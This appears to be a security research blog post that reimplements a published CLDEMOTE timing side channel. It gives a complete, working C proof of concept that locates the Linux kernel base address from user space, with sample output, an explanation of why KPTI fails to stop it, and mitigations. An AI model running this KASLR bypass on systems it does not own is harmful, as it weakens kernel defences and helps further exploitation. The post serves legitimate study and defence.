---
title: "Breaking KASLR with CLDEMOTE: From Paper to PoC"
date: 2026-03-14
reading_time: "10 min"
---

I recently came across a paper by Taehun Kim et al. — *"Demoting Security via Exploitation of Cache Demote Operation in Intel's Latest ISA Extension"* ([arXiv:2503.10074](https://arxiv.org/abs/2503.10074)) — that caught my attention. They proposed two attack primitives built on Intel's `CLDEMOTE` instruction: **Flush+Demote** (a covert channel) and **Demote+Time** (a KASLR bypass). The KASLR part was what interested me the most, so I decided to build my own proof of concept and test it on a real cloud environment.

The result: a simple C program that identifies the Linux kernel base address in under 1 ms from user space, confirmed on an AWS EC2 Sapphire Rapids instance. No page faults. No privileged access. Just timing.

---

## Quick Refresher: What Is KASLR?

KASLR (Kernel Address Space Layout Randomization) randomizes where the kernel image gets loaded in memory on each boot. On x86-64 Linux, the kernel text lives somewhere in the range `0xffffffff80000000` – `0xffffffffc0000000`, aligned to 2 MiB boundaries. That gives you roughly 512 possible positions — about 9 bits of entropy.

The whole point is to prevent attacks that rely on knowing where kernel code lives (ROP, JOP, info-leaks, etc.). If the attacker doesn't know the base address, they can't jump to useful gadgets. Simple concept — but the moment you leak that address, the protection is gone.

---

## What Is CLDEMOTE and Why Should You Care?

`CLDEMOTE` (Cache Line Demote) is a relatively new Intel instruction, available since Tiger Lake and Sapphire Rapids. You can check support via `CPUID.(EAX=07H, ECX=0):ECX[25]`.

Its intended use is a performance hint: it tells the CPU to move a cache line from L1/L2 down to the LLC (Last Level Cache), so a sibling core sharing that LLC can pick it up faster. Think producer-consumer patterns across cores.

Sounds harmless. But Kim et al. found a set of properties that make it a perfect side-channel primitive:

- **Unprivileged execution (Ring 3)** — any user-space process can run it. No capabilities, no TSX, no speculation tricks needed.
- **Fault suppression** — `CLDEMOTE` *never* raises a page fault, even when targeting kernel addresses or completely unmapped memory. It just completes silently.
- **TLB-dependent timing** — the instruction needs to translate the virtual address before doing anything. That translation interacts with the TLB, and the latency difference is measurable.
- **Works on non-inclusive LLCs** — the line gets pushed directly to the LLC, so the attack works even where classic Flush+Reload breaks.

Put these together and you get a fault-free, privilege-free timing oracle that can distinguish mapped from unmapped virtual addresses. That's all you need to break KASLR.

---

## Why the Timing Difference Exists

This is the part I had to think through carefully, so let me explain it properly.

When the CPU executes `CLDEMOTE` on a virtual address, it first needs to translate that address — even though the instruction won't fault if the translation fails. Here's what happens depending on whether the address is mapped or not:

**Mapped address (kernel code/data lives here):**
1. First `CLDEMOTE`: the CPU does a page walk, finds a valid PDE (Present = 1, PS = 1 for a 2 MiB large page), and installs the translation in the TLB.
2. Every subsequent `CLDEMOTE` on that address: TLB hit. Translation resolves in ~1-2 cycles.
3. Average across 100 iterations: **very low** (~4-6 cycles in my tests).

**Unmapped address (nothing mapped here):**
1. Every single `CLDEMOTE`: the CPU starts a page walk. It goes through PML4E and PDPT (which are typically Present = 1 for the entire kernel half), but then hits a PDE with **Present = 0**. Walk aborts.
2. No TLB entry gets installed — because you can't cache a translation that doesn't exist.
3. Next iteration? Same story. Page walk, abort, no TLB entry. Every time.
4. Average across 100 iterations: **consistently higher** (~30-40 cycles in my tests).

The key insight: **only valid translations get cached in the TLB.** Unmapped addresses never benefit from TLB caching, so they always pay the partial page-walk tax. This creates a stable ~6x gap that directly reveals which 2 MiB slots contain kernel mappings.

One thing worth noting: the upper levels of the page table hierarchy (PML4E, PDPT) are typically Present = 1 for the whole kernel address range. The difference shows up at the PDE level — which is exactly the 2 MiB granularity that KASLR uses. That's why scanning in 2 MiB steps works.

---

## The PoC

Here's the complete code:

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <cpuid.h>
#include <inttypes.h>

#define SLOT_SIZE   (2ULL * 1024 * 1024)
#define START_ADDR  0xffffffff80000000ULL
#define END_ADDR    0xffffffffc0000000ULL
#define MEASURES    100

// Check CLDEMOTE support via CPUID.(EAX=07H, ECX=0):ECX[25]
static int has_cldemote() {
    unsigned int eax, ebx, ecx, edx;
    if (!__get_cpuid_count(7, 0, &eax, &ebx, &ecx, &edx))
        return 0;
    return (ecx >> 25) & 1;
}

// Measure average latency of MEASURES CLDEMOTE instructions
static uint64_t measure_demote(void *addr) {
    uint32_t aux;
    uint64_t start = __rdtscp(&aux);
    for (int i = 0; i < MEASURES; i++) {
        asm volatile("cldemote (%0)" :: "r"(addr) : "memory");
    }
    uint64_t end = __rdtscp(&aux);
    return (end - start) / MEASURES;
}

int main() {
    if (!has_cldemote()) {
        fprintf(stderr, "[-] CLDEMOTE is not supported on this CPU.\n");
        return 1;
    }
    printf("[*] CLDEMOTE support detected. Scanning KASLR slots...\n");

    // Baseline: measure latency on the first (assumed invalid) slot
    uint64_t invalid_avg = measure_demote((void *)START_ADDR);
    uint64_t threshold   = invalid_avg - (invalid_avg / 4);
    printf("[*] Invalid slot average latency: %" PRIu64
           " cycles, threshold: %" PRIu64 "\n", invalid_avg, threshold);

    uint64_t found_addr = 0;
    uint64_t found_lat  = 0;

    for (uint64_t addr = START_ADDR; addr < END_ADDR; addr += SLOT_SIZE) {
        uint64_t lat = measure_demote((void *)addr);
        if (lat < threshold && found_addr == 0) {
            found_addr = addr;
            found_lat  = lat;
        }
        printf("Slot 0x%016" PRIx64 ": %" PRIu64 " cycles %s\n",
               addr, lat, (lat < threshold) ? "<-- candidate" : "");
    }

    if (found_addr) {
        printf("\n[+] Likely kernel base at 0x%016" PRIx64
               " with average latency %" PRIu64 " cycles\n",
               found_addr, found_lat);
    } else {
        printf("\n[-] No candidate slot identified.\n");
    }

    return 0;
}
```

### How It Works

**Feature detection:** `has_cldemote()` queries CPUID leaf 7, sub-leaf 0, bit 25 of ECX.

**Timing measurement:** `measure_demote()` reads the TSC before and after a loop of 100 `CLDEMOTE` instructions on the same address. The difference divided by 100 gives the average per-instruction latency. I use `__rdtscp` instead of `__rdtsc` because it serializes — it waits for prior instructions to retire before reading the counter.

**Baseline calibration:** The first slot (`0xffffffff80000000`) is assumed to be unmapped. Threshold is set to 75% of this baseline.

**Scan:** Walk every 2 MiB slot in the KASLR range. First slot below threshold = likely kernel base.

### A Known Limitation

The PoC assumes the first slot is always unmapped. If the kernel base happened to land exactly at `0xffffffff80000000`, the baseline measurement would be wrong and we'd miss everything.

A more robust version would use an address outside the KASLR range for calibration — something like `START_ADDR - SLOT_SIZE`. Or better: average multiple known-invalid slots. In practice the probability of hitting the first slot is ~1/512, but a proper tool should handle this.

---

## Results

Tested on an AWS EC2 instance with an Intel Sapphire Rapids processor:

```
$ ./poc
[*] CLDEMOTE support detected. Scanning KASLR slots...
[*] Invalid slot average latency: 38 cycles, threshold: 29
Slot 0xffffffff80000000: 34 cycles 
Slot 0xffffffff80200000: 34 cycles 
...
Slot 0xffffffff90e00000: 34 cycles 
Slot 0xffffffff91000000: 5 cycles <-- candidate
Slot 0xffffffff91200000: 5 cycles <-- candidate
...
Slot 0xffffffff94c00000: 5 cycles <-- candidate
Slot 0xffffffff94e00000: 33 cycles 
...
Slot 0xffffffffbfe00000: 34 cycles 

[+] Likely kernel base at 0xffffffff91000000 with average latency 5 cycles
```

Verification:

```
$ sudo grep ' _stext' /proc/kallsyms
ffffffff91000000 T _stext
```

It works. The pattern is clear:

| Region | Avg. Latency | What's Happening |
|---|---|---|
| Unmapped slots | 33-38 cycles | Page walk hits PDE with Present = 0, no TLB entry, every iteration pays the cost |
| Mapped kernel slots (`0xffffffff91000000` – `0xffffffff94c00000`) | 4-6 cycles | Valid PDE, TLB entry installed on first hit, rest are TLB hits |
| Unmapped slots (after kernel) | 33-34 cycles | Back to the same pattern |

The mapped region spans ~60 MiB of contiguous 2 MiB slots — consistent with a typical kernel text + rodata + data footprint.

---

## Why KPTI Doesn't Help

You might think KPTI (Kernel Page-Table Isolation) would block this. After all, KPTI switches to a "shadow" page table in user mode that unmaps most kernel pages — that was the whole Meltdown mitigation.

But KPTI **can't unmap everything.** The kernel needs to handle syscalls, interrupts, and exceptions coming from user space, so a small trampoline region (including `entry_SYSCALL_64`) must stay mapped in the user-mode page tables. This trampoline lives within the same 2 MiB slot as the kernel base and is randomized along with it.

This is exactly what **EntryBleed** (CVE-2022-4543) exploited using `PREFETCH` timing — and `CLDEMOTE` exploits the same fundamental issue. As long as any page within the KASLR range remains present in the user page tables, the TLB-dependent timing difference persists. KPTI reduces the attack surface, but it doesn't eliminate the oracle.

---

## Mitigations — What Actually Works?

This is where it gets tricky, because there's no single default-on fix deployed today.

**Hardware / Microcode:**
- Intel Sapphire Rapids and later expose a bit in `IA32_UARCH_MISC_CTL` (`DIS_USER_CLDEMOTE`) to disable the instruction in Ring 3. No mainstream distro enables it by default. A kernel patch that writes this MSR at boot would work — but nobody ships it yet.
- In virtualized environments, the hypervisor can mask the CLDEMOTE CPUID flag. Guest code would get `#UD` when trying to execute the instruction. Cloud providers could deploy this today without waiting for microcode updates.

**OS / Kernel:**
- **FLARE (dummy mapping):** Map all PDE entries in the KASLR range to dummy pages so that Present = 1 everywhere. Both mapped and unmapped slots would look identical to the TLB. Kills the oracle completely. But it's not upstream and costs ~1 GiB of extra memory.
- **Trampoline relocation:** Decouple the trampoline address from the kernel base, so that even if the trampoline leaks, it doesn't reveal anything else. FG-KASLR partially does this.

**Complementary (raises the bar but doesn't fix it):**
- Restrict `RDTSCP`/`RDTSC` in user space — adds noise but doesn't prevent the attack. Attackers can fall back to `clock_gettime` or other timing sources.
- Monitor anomalous `CLDEMOTE` usage with eBPF/perf.
- Increase KASLR entropy beyond 9 bits.

**Bottom line:** The most practical short-term fix for cloud providers is CPUID filtering at the hypervisor level. For bare-metal with Sapphire Rapids+, writing the `DIS_USER_CLDEMOTE` MSR works but requires manual configuration. A real fix probably needs both — disable the instruction for Ring 3 *and* decouple the trampoline from the kernel base.

---

## Conclusion

`CLDEMOTE` gives you a clean, fast, reliable way to break KASLR from user space on modern Intel processors. The side channel is straightforward to exploit, the signal-to-noise ratio is excellent (~6x in my tests), and there's no deployed default mitigation as of today.

This is a good example of how new ISA extensions — even ones designed for benign performance optimization — can open up security holes when their microarchitectural side effects aren't carefully constrained. Fault suppression + unprivileged access + observable timing = side channel. Every time.

---

## References

1. T. Kim, H. Jang, Y. Shin, *"Demoting Security via Exploitation of Cache Demote Operation in Intel's Latest ISA Extension"*, arXiv:2503.10074v2, April 2025. [Link](https://arxiv.org/abs/2503.10074)
2. W. Liu, J. Ravichandran, M. Yan, *"EntryBleed: A Universal KASLR Bypass against KPTI on Linux"*, HASP 2023. CVE-2022-4543. [Link](https://www.willsroot.io/2022/12/entrybleed.html)
3. Intel Corporation, *"Intel 64 and IA-32 Architectures Software Developer's Manual"*, Volume 2, February 2025.
4. F. Cloutier, *"x86 Instruction Reference — CLDEMOTE"*. [Link](https://www.felixcloutier.com/x86/cldemote)
5. D. Gruss et al., *"Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR"*, CCS 2016.
6. D. Gruss et al., *"KASLR is Dead: Long Live KASLR"*, ESSoS 2017.
